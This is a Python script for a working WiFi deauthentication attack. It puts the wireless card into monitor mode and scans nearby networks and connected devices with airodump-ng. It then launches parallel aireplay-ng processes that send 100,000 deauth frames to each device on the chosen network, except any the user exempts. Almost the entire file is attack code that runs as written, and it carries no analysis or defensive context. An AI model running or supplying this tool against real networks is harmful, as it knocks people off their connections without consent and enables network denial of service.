import sys
import os
import subprocess as subp
from prettytable import PrettyTable
import csv
import time
import multiprocessing


#This just to check if system arguments are correct!!
user_arg = sys.argv[1]
if(user_arg != "all" and user_arg != "select"):
    print("Wrong Arguments!\n")
    sys.exit()    



print("Working on some PreRequisites...\n")


####Premethods####
#Turning wifi mode from managed to monitor
subp.run(['bash','./Requires/premethods.sh'], capture_output=True)

print("Getting Network Ready...\nScanning...\n")

time.sleep(3)


####Catching All nearby Newtworks####
try:
    subp.run(['airodump-ng','--write','./Requires/test','wlan0'], timeout=12)
except Exception as e:
    pass



####Parsing and getting data of Networks####
subp.run(['python3','./Requires/parse.py'],capture_output=True)

with open('./Requires/network.csv','r') as f1: 
    cr = csv.reader(f1)
    l1 = []
    l2 = ['dummy','dummy','dummy']
    for line in cr:
        l2[0] = line[1]
        l2[1] = line[0]
        l2[2] = line[2]
        l1.append(l2.copy())




#####Printing all Networks####
print("------------Networks------------\n")
table = PrettyTable(['Mac_Address', 'Network_Name', 'Channel', 'Number'])
i=1
for rec in l1:
    rec.append(i)
    table.add_row(rec)
    i = i+1
print(table)


####Delelting non-required files####
subp.run('rm ./Requires/test*',shell=True,capture_output=True)



####Resetting terminal to take outputs####
subp.run('reset',capture_output=True)



####getting user Network####
target_net = int(input("Enter Number for Network you are connected to: "))
target_net_info = l1[target_net-1].copy()


####Catching all devices connected to that network####
try:
    subp.run(['airodump-ng','--bssid',target_net_info[0].strip(),'--channel',target_net_info[2].strip(),'--write','./Requires/test','wlan0'], timeout=15)
except Exception as e:
    pass



####Parsing and getting data of Devices(Mac-Address)####
subp.run(['python3','./Requires/parse2.py'],capture_output=True)
with open('./Requires/network2.csv','r') as f1: 
    cr = csv.reader(f1)
    final = []
    l2 = ['dummy','dummy']
    for line in cr:
        l2[0] = line[0]
        final.append(l2.copy())



####Deleing all non-required files####
subp.run('rm ./Requires/test*',shell=True,capture_output=True)



####Moving forward as user arguments####
if(user_arg == "all"):
    pass
else:
    while(target_net != "ok"):
        print("------------Stations------------\n")
        table = PrettyTable(['Mac_Address', 'Number'])
        i=1
        for rec in final:
            rec[1] = i
            table.add_row(rec)
            i = i+1
        print(table)
        target_net = 0

        subp.run('reset',capture_output=True)
        target_net = input("Enter Number for Station you dont want disconnect for wifi: ")
        if(target_net == "ok"):
            break
        else:
            target_net = int(target_net)    
        final.pop(target_net-1)
        print("Press ok to continue\n")


####DEauth function####
def deauthim(mac):
    subp.run(['aireplay-ng' ,'--deauth' ,'100000' ,'-a' ,target_net_info[0].strip()  ,'-c' ,mac ,'wlan0'],capture_output=True)

####Deauthenticating####
deauthid = []
for record in final:
    print("DeAuthenticating: "+record[0])
    proc = multiprocessing.Process(target = deauthim,args=(record[0],))
    proc.start()
    deauthid.append(proc)

subp.run('reset',capture_output=True)
while (True):
    last = input("Write quit and Enter to quit: ")
    if(last == "quit"):
        for reco in deauthid:
            reco.terminate()
        break    
    else:
        print("plz Enter Properly!!\n")
        continue    



####Fininzing  Attack and Rolling back####
subp.run('bash ./Requires/premethodsfix.sh',shell=True,capture_output=True)
print("Thanks for using our Program!\n")    
subp.run('reset',capture_output=True)
        

       
